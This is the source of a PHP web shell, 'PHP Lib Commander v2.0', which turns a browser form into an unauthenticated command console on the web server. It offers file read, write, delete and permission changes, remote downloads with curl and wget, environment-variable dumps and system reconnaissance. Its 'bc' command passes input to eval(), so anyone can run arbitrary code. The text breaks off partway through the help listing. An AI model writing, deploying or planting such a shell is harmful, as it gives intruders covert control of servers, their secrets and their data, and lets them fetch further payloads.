<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PHP Lib Commander v2.0 </title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
<style>
.terminal {
    font-family: 'Courier New', Courier, monospace;
    background-color: #1a1a1a;
    color: #e0e0e0;
    border-radius: 0.5rem;
    padding: 1rem;
    max-height: 600px;
    height: 80vh;
    overflow-y: auto;
    white-space: pre-wrap;
    word-break: break-all;
}
.output-success { color: #10b981; }
.output-error { color: #ef4444; }
.output-info { color: #3b82f6; }
.input-field:focus { outline: none; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.5); }
::-webkit-scrollbar { width: 8px; }
::-webkit-scrollbar-track { background: #2d2d2d; border-radius: 4px; }
::-webkit-scrollbar-thumb { background: #4b5563; border-radius: 4px; }
::-webkit-scrollbar-thumb:hover { background: #6b7280; }
.output-table { width: 100%; border-collapse: collapse; }
.output-table th, .output-table td { border: 1px solid #4b5563; padding: 4px; text-align: left; }
.output-table th { background-color: #2d2d2d; color: #e0e0e0; }
pre.prism-code { background: #2d2d2d; padding: 0.5rem; border-radius: 0.25rem; margin: 0; }
</style>
</head>
<body class="bg-gray-900 flex items-center justify-center min-h-screen">
<div class="bg-gray-800 p-6 rounded-xl shadow-2xl w-full max-w-2xl">
<h1 class="text-2xl font-bold text-white mb-4">𝙿𝙷𝙿 𝙲𝚘𝚖𝚖𝚊𝚗𝚍 𝙻𝚒𝚋𝚛𝚊𝚛𝚢 @DevidLuice </h1>
<form method="post" class="flex items-center gap-3 mb-4">
<input type="text" name="command" id="commandInput" placeholder="Enter command" class="flex-1 text-sm text-white bg-gray-700 border border-gray-600 rounded-full p-3 input-field" autocomplete="off">
<button type="submit" class="bg-blue-600 text-white text-sm font-medium py-2 px-4 rounded-full hover:bg-blue-700 transition">Run</button>
</form>
<div class="flex justify-end mb-2">
<button id="copyButton" class="bg-gray-600 text-white text-sm font-medium py-1 px-3 rounded-full hover:bg-gray-700 transition">Copy Output</button>
</div>
<div class="terminal" id="output">
<?php
$output = '';
$safeDir = getcwd() . '';
if (!is_dir($safeDir)) {
    mkdir($safeDir, 0755, true);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['command'])) {
    $input = trim(filter_input(INPUT_POST, 'command', FILTER_SANITIZE_STRING));
    $output = executePipedCommands($input, $safeDir);
    $outputClass = determineOutputClass($output);
    // Check if output is valid JSON
    $decoded = json_decode($output, true);
    if (json_last_error() === JSON_ERROR_NONE) {
        $prettyJson = json_encode($decoded, JSON_PRETTY_PRINT);
        echo '<pre class="prism-code language-json">' . htmlspecialchars($prettyJson) . '</pre>';
    } else {
        echo '<span class="' . $outputClass . '">' . htmlspecialchars($output) . '</span>';
    }
} else {
    echo '<span class="output-info">Enter a command above to begin. Type \'help\' for available commands.</span>';
}

function executePipedCommands($input, $safeDir) {
    $commands = preg_split('/\s*\|\s*/', $input, -1, PREG_SPLIT_NO_EMPTY);
    $output = '';

    foreach ($commands as $index => $cmd) {
        $cmd = trim($cmd);
        if ($index === 0) {
            $output = executeSingleCommand($cmd, $safeDir, '');
        } else {
            $output = executeSingleCommand($cmd, $safeDir, $output);
        }
        if (strpos($output, 'Error:') === 0) {
            break;
        }
    }
    return $output;
}

function executeSingleCommand($input, $safeDir, $prevOutput) {
    $parts = preg_split('/\s+/', $input, -1, PREG_SPLIT_NO_EMPTY);
    $command = strtolower($parts[0]);
    $args = array_slice($parts, 1);
    $output = '';

    $allowedCommands = [
        'ls', 'curl', 'cat', 'wget', 'id', 'pwd', 'grep', 'whoami', 'echo', 'mkdir', 'rm', 'touch', 'help',
        'mv', 'cp', 'chmod', 'chown', 'find', 'wc', 'head', 'tail', 'sort', 'uniq', 'cut', 'paste', 'date',
        'uptime', 'who', 'df', 'du', 'ln', 'basename', 'dirname', 'realpath', 'stat', 'file', 'md5sum',
        'sha1sum', 'env', 'clear', 'history', 'uname', 'hostname', 'which', 'test', 'expr', 'tee', 'cmp',
        'diff', 'tr', 'fold', 'nl', 'od', 'split', 'join', 'bc', 'printf', 'sleep', 'yes', 'seq',
        'readlink', 'cksum'
    ];
    if (!in_array($command, $allowedCommands)) {
        return "Error: Unknown command '$command'\nType 'help' for available commands.";
    }

    switch ($command) {
        case 'ls':
            $dir = !empty($args[0]) ? $safeDir . $args[0] : $safeDir;
            if (!is_dir($dir)) {
                return "Error: '$dir' is not a directory";
            }
            $files = scandir($dir);
            if ($files === false) {
                return "Error: Unable to read directory '$dir'";
            }
            foreach ($files as $file) {
                if ($file !== '.' && $file !== '..') {
                    $output .= "$file\n";
                }
            }
            break;

        case 'curl':
            if (empty($args[0])) {
                return "Error: URL required";
            }
            if (!extension_loaded('curl')) {
                return "Error: cURL extension not loaded";
            }
            $ch = curl_init($args[0]);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
            $result = curl_exec($ch);
            if ($result === false) {
                $output = "Error: cURL failed - " . curl_error($ch);
            } else {
                $output = $result;
            }
            curl_close($ch);
            break;

        case 'cat':
            if (empty($args[0]) && !$prevOutput) {
                return "Error: File path required";
            }
            if ($prevOutput) {
                $output = $prevOutput;
            } else {
                $file = $safeDir . $args[0];
                if (strpos($file, $safeDir) !== 0 || str_contains($file, '/etc/')) {
                    return "Error: Access to '$file' is restricted";
                }
                if (!file_exists($file)) {
                    return "Error: File '$file' does not exist";
                }
                $content = file_get_contents($file);
                if ($content === false) {
                    return "Error: Unable to read file '$file'";
                }
                $output = $content;
            }
            break;

        case 'wget':
            if (empty($args[0])) {
                return "Error: URL required";
            }
            $url = $args[0];
            $filename = !empty($args[1]) ? $safeDir . $args[1] : $safeDir . basename($url);
            if (strpos($filename, $safeDir) !== 0) {
                return "Error: Cannot save outside Uploads/";
            }
            $content = @file_get_contents($url);
            if ($content === false) {
                return "Error: Unable to download '$url'";
            }
            if (file_put_contents($filename, $content) === false) {
                return "Error: Unable to save file '$filename'";
            }
            $output = "Downloaded '$url' to '$filename'";
            break;

        case 'id':
            if (!function_exists('posix_getuid')) {
                return "Error: POSIX extension not loaded";
            }
            $uid = posix_getuid();
            $userInfo = posix_getpwuid($uid);
            $gid = posix_getgid();
            $groupInfo = posix_getgrgid($gid);
            $output = "uid=$uid({$userInfo['name']}) gid=$gid({$groupInfo['name']})";
            break;

        case 'pwd':
            $output = getcwd();
            break;

        case 'grep':
            if (empty($args[0])) {
                return "Error: Pattern required";
            }
            $pattern = $args[0];
            if ($prevOutput) {
                $lines = explode("\n", trim($prevOutput));
            } elseif (!empty($args[1])) {
                $file = $safeDir . $args[1];
                if (strpos($file, $safeDir) !== 0 || str_contains($file, '/etc/')) {
                    return "Error: Access to '$file' is restricted";
                }
                if (!file_exists($file)) {
                    return "Error: File '$file' does not exist";
                }
                $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            } else {
                return "Error: File or piped input required";
            }
            foreach ($lines as $line) {
                if (preg_match("/$pattern/", $line)) {
                    $output .= "$line\n";
                }
            }
            break;

        case 'whoami':
            if (!function_exists('posix_getpwuid')) {
                return "Error: POSIX extension not loaded";
            }
            $userInfo = posix_getpwuid(posix_getuid());
            $output = $userInfo['name'];
            break;

        case 'echo':
            $output = implode(' ', $args);
            break;

        case 'mkdir':
            if (empty($args[0])) {
                return "Error: Directory name required";
            }
            $dir = $safeDir . $args[0];
            if (strpos($dir, $safeDir) !== 0) {
                return "Error: Cannot create outside Uploads/";
            }
            if (mkdir($dir)) {
                $output = "Directory '$dir' created";
            } else {
                $output = "Error: Failed to create directory '$dir'";
            }
            break;

        case 'rm':
            if (empty($args[0])) {
                return "Error: File or directory name required";
            }
            $path = $safeDir . $args[0];
            if (strpos($path, $safeDir) !== 0) {
                return "Error: Cannot remove outside Uploads/";
            }
            if (is_file($path)) {
                if (unlink($path)) {
                    $output = "File '$path' removed";
                } else {
                    $output = "Error: Failed to remove file '$path'";
                }
            } elseif (is_dir($path)) {
                if (rmdir($path)) {
                    $output = "Directory '$path' removed";
                } else {
                    $output = "Error: Failed to remove directory '$path' (is it empty?)";
                }
            } else {
                $output = "Error: '$path' does not exist";
            }
            break;

        case 'touch':
            if (empty($args[0])) {
                return "Error: File name required";
            }
            $file = $safeDir . $args[0];
            if (strpos($file, $safeDir) !== 0) {
                return "Error: Cannot touch outside Uploads/";
            }
            if (touch($file)) {
                $output = "File '$file' created or updated";
            } else {
                $output = "Error: Failed to touch file '$file'";
            }
            break;

        case 'mv':
            if (count($args) < 2) {
                return "Error: Source and destination required";
            }
            $source = $safeDir . $args[0];
            $dest = $safeDir . $args[1];
            if (strpos($source, $safeDir) !== 0 || strpos($dest, $safeDir) !== 0) {
                return "Error: Cannot operate outside Uploads/";
            }
            if (!file_exists($source)) {
                return "Error: Source '$source' does not exist";
            }
            if (rename($source, $dest)) {
                $output = "Moved '$source' to '$dest'";
            } else {
                $output = "Error: Failed to move '$source' to '$dest'";
            }
            break;

        case 'cp':
            if (count($args) < 2) {
                return "Error: Source and destination required";
            }
            $source = $safeDir . $args[0];
            $dest = $safeDir . $args[1];
            if (strpos($source, $safeDir) !== 0 || strpos($dest, $safeDir) !== 0) {
                return "Error: Cannot operate outside Uploads/";
            }
            if (!file_exists($source)) {
                return "Error: Source '$source' does not exist";
            }
            if (copy($source, $dest)) {
                $output = "Copied '$source' to '$dest'";
            } else {
                $output = "Error: Failed to copy '$source' to '$dest'";
            }
            break;

        case 'chmod':
            if (count($args) < 2) {
                return "Error: Mode and file required";
            }
            $mode = octdec($args[0]);
            $file = $safeDir . $args[1];
            if (strpos($file, $safeDir) !== 0) {
                return "Error: Cannot operate outside Uploads/";
            }
            if (!file_exists($file)) {
                return "Error: File '$file' does not exist";
            }
            if (chmod($file, $mode)) {
                $output = "Changed permissions of '$file' to " . sprintf("%o", $mode);
            } else {
                $output = "Error: Failed to change permissions of '$file'";
            }
            break;

        case 'chown':
            if (count($args) < 2) {
                return "Error: User and file required";
            }
            $user = $args[0];
            $file = $safeDir . $args[1];
            if (strpos($file, $safeDir) !== 0) {
                return "Error: Cannot operate outside Uploads/";
            }
            if (!file_exists($file)) {
                return "Error: File '$file' does not exist";
            }
            if (chown($file, $user)) {
                $output = "Changed owner of '$file' to '$user'";
            } else {
                $output = "Error: Failed to change owner of '$file'";
            }
            break;

        case 'find':
            $dir = !empty($args[0]) ? $safeDir . $args[0] : $safeDir;
            if (!is_dir($dir)) {
                return "Error: '$dir' is not a directory";
            }
            $output = findFiles($dir);
            break;

        case 'wc':
            if (empty($args[0]) && !$prevOutput) {
                return "Error: File required";
            }
            if ($prevOutput) {
                $content = explode("\n", $prevOutput);
            } else {
                $file = $safeDir . $args[0];
                if (strpos($file, $safeDir) !== 0) {
                    return "Error: Cannot operate outside Uploads/";
                }
                if (!file_exists($file)) {
                    return "Error: File '$file' does not exist";
                }
                $content = file($file, FILE_IGNORE_NEW_LINES);
            }
            $lines = count($content);
            $words = array_sum(array_map('str_word_count', $content));
            $chars = strlen(implode("\n", $content));
            $output = "$lines $words $chars";
            break;

        case 'head':
            if (empty($args[0]) && !$prevOutput) {
                return "Error: File required";
            }
            if ($prevOutput) {
                $lines = explode("\n", trim($prevOutput));
            } else {
                $file = $safeDir . $args[0];
                if (strpos($file, $safeDir) !== 0) {
                    return "Error: Cannot operate outside Uploads/";
                }
                if (!file_exists($file)) {
                    return "Error: File '$file' does not exist";
                }
                $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            }
            $n = !empty($args[1]) && is_numeric($args[1]) ? (int)$args[1] : 10;
            $output = implode("\n", array_slice($lines, 0, $n));
            break;

        case 'tail':
            if (empty($args[0]) && !$prevOutput) {
                return "Error: File required";
            }
            if ($prevOutput) {
                $lines = explode("\n", trim($prevOutput));
            } else {
                $file = $safeDir . $args[0];
                if (strpos($file, $safeDir) !== 0) {
                    return "Error: Cannot operate outside Uploads/";
                }
                if (!file_exists($file)) {
                    return "Error: File '$file' does not exist";
                }
                $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            }
            $n = !empty($args[1]) && is_numeric($args[1]) ? (int)$args[1] : 10;
            $output = implode("\n", array_slice($lines, -$n));
            break;

        case 'sort':
            if (empty($args[0]) && !$prevOutput) {
                return "Error: File required";
            }
            if ($prevOutput) {
                $lines = explode("\n", trim($prevOutput));
            } else {
                $file = $safeDir . $args[0];
                if (strpos($file, $safeDir) !== 0) {
                    return "Error: Cannot operate outside Uploads/";
                }
                if (!file_exists($file)) {
                    return "Error: File '$file' does not exist";
                }
                $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            }
            sort($lines);
            $output = implode("\n", $lines);
            break;

        case 'uniq':
            if (empty($args[0]) && !$prevOutput) {
                return "Error: File required";
            }
            if ($prevOutput) {
                $lines = explode("\n", trim($prevOutput));
            } else {
                $file = $safeDir . $args[0];
                if (strpos($file, $safeDir) !== 0) {
                    return "Error: Cannot operate outside Uploads/";
                }
                if (!file_exists($file)) {
                    return "Error: File '$file' does not exist";
                }
                $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            }
            $output = implode("\n", array_unique($lines));
            break;

        case 'cut':
            if (count($args) < 3 || $args[0] !== '-f') {
                return "Error: Usage: cut -f <field> <file>";
            }
            $field = (int)$args[1];
            if ($prevOutput) {
                $lines = explode("\n", trim($prevOutput));
            } else {
                $file = $safeDir . $args[2];
                if (strpos($file, $safeDir) !== 0) {
                    return "Error: Cannot operate outside Uploads/";
                }
                if (!file_exists($file)) {
                    return "Error: File '$file' does not exist";
                }
                $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            }
            foreach ($lines as $line) {
                $fields = explode(' ', $line);
                if (isset($fields[$field - 1])) {
                    $output .= $fields[$field - 1] . "\n";
                }
            }
            break;

        case 'paste':
            if (count($args) < 2) {
                return "Error: At least two files required";
            }
            $files = array_map(function($f) use ($safeDir) { return $safeDir . $f; }, $args);
            foreach ($files as $file) {
                if (strpos($file, $safeDir) !== 0) {
                    return "Error: Cannot operate outside Uploads/";
                }
                if (!file_exists($file)) {
                    return "Error: File '$file' does not exist";
                }
            }
            $lines = [];
            foreach ($files as $file) {
                $lines[] = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            }
            $max = max(array_map('count', $lines));
            for ($i = 0; $i < $max; $i++) {
                $row = [];
                foreach ($lines as $fileLines) {
                    $row[] = isset($fileLines[$i]) ? $fileLines[$i] : '';
                }
                $output .= implode("\t", $row) . "\n";
            }
            break;

        case 'date':
            $output = date('Y-m-d H:i:s');
            break;

        case 'uptime':
            if (!function_exists('sys_getloadavg')) {
                return "Error: sys_getloadavg not available";
            }
            $load = sys_getloadavg();
            $output = "Load average: {$load[0]} {$load[1]} {$load[2]}";
            break;

        case 'who':
            if (!function_exists('posix_getpwuid')) {
                return "Error: POSIX extension not loaded";
            }
            $output = posix_getpwuid(posix_getuid())['name'] . " web " . date('Y-m-d H:i');
            break;

        case 'df':
            $output = "<table class='output-table'>";
            $output .= "<tr><th>Filesystem</th><th>Size</th><th>Used</th><th>Available</th></tr>";
            $size = disk_total_space($safeDir);
            $free = disk_free_space($safeDir);
            $used = $size - $free;
            $output .= "<tr><td>$safeDir</td><td>" . formatSize($size) . "</td><td>" . formatSize($used) . "</td><td>" . formatSize($free) . "</td></tr>";
            $output .= "</table>";
            break;

        case 'du':
            $path = !empty($args[0]) ? $safeDir . $args[0] : $safeDir;
            if (strpos($path, $safeDir) !== 0) {
                return "Error: Cannot operate outside Uploads/";
            }
            if (!file_exists($path)) {
                return "Error: '$path' does not exist";
            }
            $size = calculateDirSize($path);
            $output = formatSize($size) . "\t$path";
            break;

        case 'ln':
            if (count($args) < 2) {
                return "Error: Source and link name required";
            }
            $source = $safeDir . $args[0];
            $link = $safeDir . $args[1];
            if (strpos($source, $safeDir) !== 0 || strpos($link, $safeDir) !== 0) {
                return "Error: Cannot operate outside Uploads/";
            }
            if (!file_exists($source)) {
                return "Error: Source '$source' does not exist";
            }
            if (symlink($source, $link)) {
                $output = "Created symlink '$link' -> '$source'";
            } else {
                $output = "Error: Failed to create symlink";
            }
            break;

        case 'basename':
            if (empty($args[0])) {
                return "Error: Path required";
            }
            $output = basename($args[0]);
            break;

        case 'dirname':
            if (empty($args[0])) {
                return "Error: Path required";
            }
            $output = dirname($args[0]);
            break;

        case 'realpath':
            if (empty($args[0])) {
                return "Error: Path required";
            }
            $path = $safeDir . $args[0];
            if (strpos($path, $safeDir) !== 0) {
                return "Error: Cannot operate outside Uploads/";
            }
            if (!file_exists($path)) {
                return "Error: '$path' does not exist";
            }
            $output = realpath($path);
            break;

        case 'stat':
            if (empty($args[0])) {
                return "Error: File required";
            }
            $file = $safeDir . $args[0];
            if (strpos($file, $safeDir) !== 0) {
                return "Error: Cannot operate outside Uploads/";
            }
            if (!file_exists($file)) {
                return "Error: File '$file' does not exist";
            }
            $stat = stat($file);
            $output = "File: $file\n";
            $output .= "Size: {$stat['size']}\n";
            $output .= "Permissions: " . sprintf("%o", $stat['mode'] & 0777) . "\n";
            $output .= "Last modified: " . date('Y-m-d H:i:s', $stat['mtime']);
            break;

        case 'file':
            if (empty($args[0])) {
                return "Error: File required";
            }
            $file = $safeDir . $args[0];
            if (strpos($file, $safeDir) !== 0) {
                return "Error: Cannot operate outside Uploads/";
            }
            if (!file_exists($file)) {
                return "Error: File '$file' does not exist";
            }
            $output = "$file: " . (is_file($file) ? "regular file" : (is_dir($file) ? "directory" : "other"));
            break;

        case 'md5sum':
            if (empty($args[0])) {
                return "Error: File required";
            }
            $file = $safeDir . $args[0];
            if (strpos($file, $safeDir) !== 0) {
                return "Error: Cannot operate outside Uploads/";
            }
            if (!file_exists($file)) {
                return "Error: File '$file' does not exist";
            }
            $output = md5_file($file) . "  $args[0]";
            break;

        case 'sha1sum':
            if (empty($args[0])) {
                return "Error: File required";
            }
            $file = $safeDir . $args[0];
            if (strpos($file, $safeDir) !== 0) {
                return "Error: Cannot operate outside Uploads/";
            }
            if (!file_exists($file)) {
                return "Error: File '$file' does not exist";
            }
            $output = sha1_file($file) . "  $args[0]";
            break;

        case 'env':
            $output = '';
            foreach ($_ENV as $key => $value) {
                $output .= "$key=$value\n";
            }
            break;

        case 'clear':
            $output = '<script>document.getElementById("output").innerHTML = "";</script>';
            break;

        case 'history':
            $output = '<script>document.getElementById("output").innerHTML = JSON.parse(localStorage.getItem("commandoHistory")).join("\n");</script>';
            break;

        case 'uname':
            $output = php_uname();
            break;

        case 'hostname':
            $output = gethostname();
            break;

        case 'which':
            if (empty($args[0])) {
                return "Error: Command name required";
            }
            $output = in_array($args[0], $allowedCommands) ? "Command '$args[0]' is available" : "Command '$args[0]' not found";
            break;

        case 'test':
            if (count($args) < 3 || !in_array($args[1], ['-eq', '-ne', '-lt', '-le', '-gt', '-ge'])) {
                return "Error: Usage: test <num1> <op> <num2>";
            }
            $num1 = (int)$args[0];
            $num2 = (int)$args[2];
            switch ($args[1]) {
                case '-eq': $result = $num1 == $num2; break;
                case '-ne': $result = $num1 != $num2; break;
                case '-lt': $result = $num1 < $num2; break;
                case '-le': $result = $num1 <= $num2; break;
                case '-gt': $result = $num1 > $num2; break;
                case '-ge': $result = $num1 >= $num2; break;
            }
            $output = $result ? "True" : "False";
            break;

                case 'expr':
                    if (count($args) < 3 || !in_array($args[1], ['+', '-', '*', '/', '%'])) {
                        return "Error: Usage: expr <num1> <op> <num2>";
                    }
                    $num1 = (int)$args[0];
                    $num2 = (int)$args[2];
                    switch ($args[1]) {
                        case '+': $output = $num1 + $num2; break;
                        case '-': $output = $num1 - $num2; break;
                        case '*': $output = $num1 * $num2; break;
                        case '/': $output = $num2 != 0 ? $num1 / $num2 : "Error: Division by zero"; break;
                        case '%': $output = $num2 != 0 ? $num1 % $num2 : "Error: Division by zero"; break;
                    }
                    break;

                        case 'tee':
                            if (empty($args[0])) {
                                return "Error: File required";
                            }
                            $file = $safeDir . $args[0];
                            if (strpos($file, $safeDir) !== 0) {
                                return "Error: Cannot operate outside Uploads/";
                            }
                            if ($prevOutput) {
                                file_put_contents($file, $prevOutput);
                                $output = $prevOutput;
                            } else {
                                $output = "Error: No input provided";
                            }
                            break;

                        case 'cmp':
                            if (count($args) < 2) {
                                return "Error: Two files required";
                            }
                            $file1 = $safeDir . $args[0];
                            $file2 = $safeDir . $args[1];
                            if (strpos($file1, $safeDir) !== 0 || strpos($file2, $safeDir) !== 0) {
                                return "Error: Cannot operate outside Uploads/";
                            }
                            if (!file_exists($file1) || !file_exists($file2)) {
                                return "Error: One or both files do not exist";
                            }
                            $output = md5_file($file1) === md5_file($file2) ? "Files are identical" : "Files differ";
                            break;

                        case 'diff':
                            if (count($args) < 2) {
                                return "Error: Two files required";
                            }
                            $file1 = $safeDir . $args[0];
                            $file2 = $safeDir . $args[1];
                            if (strpos($file1, $safeDir) !== 0 || strpos($file2, $safeDir) !== 0) {
                                return "Error: Cannot operate outside Uploads/";
                            }
                            if (!file_exists($file1) || !file_exists($file2)) {
                                return "Error: One or both files do not exist";
                            }
                            $lines1 = file($file1, FILE_IGNORE_NEW_LINES);
                            $lines2 = file($file2, FILE_IGNORE_NEW_LINES);
                            $output = "Differences:\n";
                            $max = max(count($lines1), count($lines2));
                            for ($i = 0; $i < $max; $i++) {
                                $line1 = $lines1[$i] ?? '';
                                $line2 = $lines2[$i] ?? '';
                                if ($line1 !== $line2) {
                                    $output .= "Line " . ($i + 1) . ": <$line1 >$line2\n";
                                }
                            }
                            break;

                        case 'tr':
                            if (count($args) < 3) {
                                return "Error: Usage: tr <set1> <set2> <file>";
                            }
                            if ($prevOutput) {
                                $output = strtr($prevOutput, $args[0], $args[1]);
                            } else {
                                $file = $safeDir . $args[2];
                                if (strpos($file, $safeDir) !== 0) {
                                    return "Error: Cannot operate outside Uploads/";
                                }
                                if (!file_exists($file)) {
                                    return "Error: File '$file' does not exist";
                                }
                                $content = file_get_contents($file);
                                $output = strtr($content, $args[0], $args[1]);
                            }
                            break;

                        case 'fold':
                            if (empty($args[0]) && !$prevOutput) {
                                return "Error: File required";
                            }
                            $width = !empty($args[1]) && is_numeric($args[1]) ? (int)$args[1] : 80;
                            if ($prevOutput) {
                                $content = $prevOutput;
                            } else {
                                $file = $safeDir . $args[0];
                                if (strpos($file, $safeDir) !== 0) {
                                    return "Error: Cannot operate outside Uploads/";
                                }
                                if (!file_exists($file)) {
                                    return "Error: File '$file' does not exist";
                                }
                                $content = file_get_contents($file);
                            }
                            $output = wordwrap($content, $width, "\n", true);
                            break;

                        case 'nl':
                            if (empty($args[0]) && !$prevOutput) {
                                return "Error: File required";
                            }
                            if ($prevOutput) {
                                $lines = explode("\n", trim($prevOutput));
                            } else {
                                $file = $safeDir . $args[0];
                                if (strpos($file, $safeDir) !== 0) {
                                    return "Error: Cannot operate outside Uploads/";
                                }
                                if (!file_exists($file)) {
                                    return "Error: File '$file' does not exist";
                                }
                                $lines = file($file, FILE_IGNORE_NEW_LINES);
                            }
                            foreach ($lines as $i => $line) {
                                $output .= sprintf("%6d  %s\n", $i + 1, $line);
                            }
                            break;

                        case 'od':
                            if (empty($args[0]) && !$prevOutput) {
                                return "Error: File required";
                            }
                            if ($prevOutput) {
                                $content = $prevOutput;
                            } else {
                                $file = $safeDir . $args[0];
                                if (strpos($file, $safeDir) !== 0) {
                                    return "Error: Cannot operate outside Uploads/";
                                }
                                if (!file_exists($file)) {
                                    return "Error: File '$file' does not exist";
                                }
                                $content = file_get_contents($file);
                            }
                            $output = bin2hex($content);
                            break;

                        case 'split':
                            if (count($args) < 2) {
                                return "Error: File and prefix required";
                            }
                            $file = $safeDir . $args[0];
                            $prefix = $safeDir . $args[1];
                            if (strpos($file, $safeDir) !== 0 || strpos($prefix, $safeDir) !== 0) {
                                return "Error: Cannot operate outside Uploads/";
                            }
                            if (!file_exists($file)) {
                                return "Error: File '$file' does not exist";
                            }
                            $content = file_get_contents($file);
                            $chunkSize = 1024;
                            $chunks = str_split($content, $chunkSize);
                            foreach ($chunks as $i => $chunk) {
                                file_put_contents($prefix . $i, $chunk);
                            }
                            $output = "Split '$file' into " . count($chunks) . " files";
                            break;

                        case 'join':
                            if (count($args) < 2) {
                                return "Error: Two files required";
                            }
                            $file1 = $safeDir . $args[0];
                            $file2 = $safeDir . $args[1];
                            if (strpos($file1, $safeDir) !== 0 || strpos($file2, $safeDir) !== 0) {
                                return "Error: Cannot operate outside Uploads/";
                            }
                            if (!file_exists($file1) || !file_exists($file2)) {
                                return "Error: One or both files do not exist";
                            }
                            $lines1 = file($file1, FILE_IGNORE_NEW_LINES);
                            $lines2 = file($file2, FILE_IGNORE_NEW_LINES);
                            $max = max(count($lines1), count($lines2));
                            for ($i = 0; $i < $max; $i++) {
                                $line1 = $lines1[$i] ?? '';
                                $line2 = $lines2[$i] ?? '';
                                $output .= "$line1 $line2\n";
                            }
                            break;

                        case 'bc':
                            if (empty($args[0])) {
                                return "Error: Expression required";
                            }
                            $expr = implode(' ', $args);
                            $output = eval("return $expr;"); // Simplified, not safe for production
                            break;

                        case 'printf':
                            if (empty($args[0])) {
                                return "Error: Format string required";
                            }
                            $format = array_shift($args);
                            $output = vsprintf($format, $args);
                            break;

                        case 'sleep':
                            $output = "Sleep not implemented in web context";
                            break;

                        case 'yes':
                            $output = str_repeat(implode(' ', $args) . "\n", 10);
                            break;

                        case 'seq':
                            if (count($args) < 2 || !is_numeric($args[0]) || !is_numeric($args[1])) {
                                return "Error: Usage: seq <start> <end>";
                            }
                            $start = (int)$args[0];
                            $end = (int)$args[1];
                            for ($i = $start; $i <= $end; $i++) {
                                $output .= "$i\n";
                            }
                            break;

                        case 'readlink':
                            if (empty($args[0])) {
                                return "Error: File required";
                            }
                            $file = $safeDir . $args[0];
                            if (strpos($file, $safeDir) !== 0) {
                                return "Error: Cannot operate outside Uploads/";
                            }
                            if (!is_link($file)) {
                                return "Error: '$file' is not a symbolic link";
                            }
                            $output = readlink($file);
                            break;

                        case 'cksum':
                            if (empty($args[0])) {
                                return "Error: File required";
                            }
                            $file = $safeDir . $args[0];
                            if (strpos($file, $safeDir) !== 0) {
                                return "Error: Cannot operate outside Uploads/";
                            }
                            if (!file_exists($file)) {
                                return "Error: File '$file' does not exist";
                            }
                            $content = file_get_contents($file);
                            $output = sprintf("%u %d %s", crc32($content), strlen($content), $args[0]);
                            break;

                        case 'help':
                            $output = "Available commands:\n";
                            $commands = [
                                'ls [dir]' => 'List directory contents',
                                'curl <url>' => 'Fetch content from a URL',
                                'cat <file>' => 'Display file contents',
                                'wget <url> [file]' => 'Download a file from a URL',
                                'id' => 'Show user and group IDs',
                                'pwd' => 'Print working directory',
                                'grep <pattern> <file>' => 'Search for a pattern in a file',
                                'whoami' => 'Show current username',
                                'echo <text>' => 'Print text to console',
                                'mkdir <dir>' => 'Create a directory',
                                'rm <path>' => 'Remove a file or empty directory',
                                'touch <file>' => 'Create or update a file',
                                'mv <source> <dest>' => 'Move or rename a file',
                                'cp <source> <dest>' => 'Copy a file',
                                'chmod <mode> <file>' => 'Change file permissions',
                                'chown <user> <file>' => 'Change file owner',
                                'find [dir]' => 'Find files in a directory',
                                'wc <file>' => 'Count lines, words, characters',
                                'head <file> [n]' => 'Show first n lines (default 10)',
                                'tail <file> [n]' => 'Show last n lines (default 10)',
                                'sort <file>' => 'Sort lines of a file',
                                'uniq <file>' => 'Remove duplicate lines',
                                'cut -f <field> <file>' => 'Extract field from file',
                                'paste <file1> <file2>' => 'Merge lines of files',
                                'date' => 'Show current date and time',
                                'uptime' => 'Show system load average',
                                'who' => 'Show current user',
                                'df' => 'Show disk usage',
                                'du [path]' => 'Show directory size',
                                'ln <source> <link>' => 'Create a symbolic link',
                                'basename <path>' => 'Show file name from path',
                                'dirname <path>' => 'Show directory from path',
                                'realpath <path>' => 'Show absolute path',
                                'stat <file>' => 'Show file stats',
                                'file <file>' => 'Show file type',
                                'md5sum <file>' => 'Calculate MD5 checksum',
                                'sha1sum <file>' => 'Calculate SHA1 checksum',
                                'env' => 'Show environment variables',
                                'clear' => 'Clear output area',
                                'history' => 'Show command history',
                                'uname' => 'Show system information',
                                'hostname' => 'Show hostname',
                                'which <cmd>' => 'Check if command exists',
                                'test <num1> <op> <num2>' => 'Compare numbers (-eq, -ne, -lt, -le, -gt, -ge)',
                                'expr <num1> <op> <num2>' => 'Evaluate expression (+, -, *, /, %)',
                                'tee <file>' => 'Write to file and output',
                                'cmp <file1> <file2>' => 'Compare two files',
                                'diff <file1> <file2>' => 'Show differences between files',
                                'tr <set1> <set2> <file>' => 'Translate characters',
                                'fold <file> [width]' => 'Wrap lines at width',
                                'nl <file>' => 'Number lines',
                                'od <file>' => 'Show file in hex',
                                'split <file> <prefix>' => 'Split file into chunks',
                                'join <file1> <file2>' => 'Join lines of files',
                                'bc <expr>' => 'Calculate expression',
                                'printf <format> [args]' => 'Formatted output',
                                'sleep <seconds>' => 'Pause (not implemented)',
                                'yes [string]' => 'Repeat string',
                                'seq <start> <end>' => 'Generate number sequence',
                                'readlink <file>' => 'Show symlink target',
                                'cksum <file>' => 'Calculate CRC checksum'
                            ];
                            foreach ($commands as $cmd => $desc) {
